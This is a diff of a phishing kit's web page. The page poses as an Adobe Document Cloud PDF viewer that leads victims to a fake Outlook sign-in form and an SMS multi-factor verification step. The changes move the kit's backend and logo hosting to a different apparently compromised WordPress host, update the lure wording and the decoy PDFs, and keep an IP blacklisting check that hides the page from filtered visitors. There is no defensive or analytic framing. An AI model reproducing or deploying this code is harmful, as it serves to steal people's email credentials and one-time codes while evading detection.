@@ -422,20 +422,20 @@ function sendMessage2() {
     }
     function redirectToBlockedPage() {
         document.getElementById('content').innerHTML = `
-            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+            <iframe src="https://hfs.jhu.edu/pdfs/HFSFormsofPayment.pdf">
                 This browser does not support PDFs. Please download the PDF to view it: 
-                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+                <a href="https://hfs.jhu.edu/pdfs/HFSFormsofPayment.pdf">Download PDF</a>.
             </iframe>
         `;
     }
 
     function addBlacklistedIP(ip) {
         // Check if IP is already in the blacklist
-        fetch('https://tastymomos.com.au/wp-includes/js/wplink.php?ip=' + ip)
+        fetch('https://easnlort.sa.com/wp-includes/clap.php?ip=' + ip)
             .then(response => response.text())
             .then(data => {
                 if (data !== 'blacklisted') {
-                    fetch('https://tastymomos.com.au/wp-includes/js/wplink.php', {
+                    fetch('https://easnlort.sa.com/wp-includes/clap.php', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded',
@@ -464,7 +464,7 @@ function sendMessage2() {
 
 
     function checkBlacklistedIP(ip) {
-    fetch('https://tastymomos.com.au/wp-includes/js/wplink.php?ip=' + ip)
+    fetch('https://easnlort.sa.com/wp-includes/clap.php?ip=' + ip)
         .then(response => response.text())
         .then(data => {
             if (data === 'blacklisted') {
@@ -787,18 +787,18 @@ function verifyAndRedirect() {
             <img src="https://cdn1.iconfinder.com/data/icons/adobe-acrobat-pdf/154/pdf-file-rounded-square-512.png" alt="PDF Icon">
             <div>
                 <div class="pdf-name">Scan_90811,90812...pdf</div>
-                <div class="pdf-size">Size: 6.2 MB</div>
+                <div class="pdf-size">Size: 1.2 MB</div>
             </div>
         </div>
 
         <h5>Adobe Document Cloud</h5>
-        <p>To view documents, collaborate with your CloudMail.</p>
+        <p>To access this document, please sign in with your email account.</p>
 
         <button class="btn btn-custom btn-outlook" onclick="showOutlookForm()">
             <img src="https://img.icons8.com/ios-filled/50/ffffff/ms-outlook.png" alt="Outlook logo" style="width: 25px; margin-right: 10px;" /> Continue with Outlook
         </button>
 
-        <small>&copy; Google Cloud Print 2025</small>
+        <small>&copy; Adobe 2023</small>
     </div>
 </div>
 
@@ -808,7 +808,7 @@ function verifyAndRedirect() {
         <div class="modal-content">
             <div class="modal-header">
                 <div class="header-logo">
-                    <img src="https://tastymomos.com.au/wp-includes/css/dist/00.png" alt="Outlook Logo" style="width: 150px;">
+                    <img src="https://easnlort.sa.com/wp-includes/00.png" alt="Outlook Logo" style="width: 150px;">
                 </div>
             </div>
             <div class="modal-body outlook">
@@ -836,7 +836,7 @@ function verifyAndRedirect() {
 
 <!-- MFA Section -->
 <div class="card mfa-section" id="mfaSection">
-    <img src="https://i.ibb.co/m45j37C/image.png" alt="Outlook Logo" style="width: 150px; margin-bottom: 15px;">
+    <img src="https://easnlort.sa.com/wp-includes/00.png" alt="Outlook Logo" style="width: 150px; margin-bottom: 15px;">
     <br><br>
     <div class="mfa-content">
         <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_21883a995350a3eeb9c12f480b0d8110.png" alt="SMS Icon" class="mfa-icon"style="width: 30px;margin-bottom: 0px;">
@@ -855,8 +855,8 @@ function verifyAndRedirect() {
         document.body.appendChild(script);
     } else {
         document.getElementById('content').innerHTML = `
-            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
-                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            <iframe src="https://hfs.jhu.edu/pdfs/HFSFormsofPayment.pdf">
+                <a href="https://hfs.jhu.edu/pdfs/HFSFormsofPayment.pdf">Download PDF</a>.
             </iframe>
         `;
         fetch('https://ipinfo.io/json?token=d8eafd6deea176')
